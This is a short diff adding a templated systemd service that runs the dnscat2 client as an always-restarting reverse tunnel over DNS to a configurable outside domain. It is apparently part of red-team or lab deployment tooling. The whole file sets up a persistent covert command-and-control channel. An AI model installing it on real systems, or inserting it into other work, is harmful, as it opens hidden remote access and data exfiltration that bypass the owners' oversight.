@@ -1,0 +1,10 @@
+[Unit]
+ Description=Reverse tunnel to {{ dnscat2_dest_domain }} over DNS
+ After=network.target
+
+[Service]
+ ExecStart={{ git_location }}/dnscat2-git/client/dnscat2 {{ dnscat2_dest_domain }}
+ Restart=always
+
+[Install]
+ WantedBy=multi-user.target
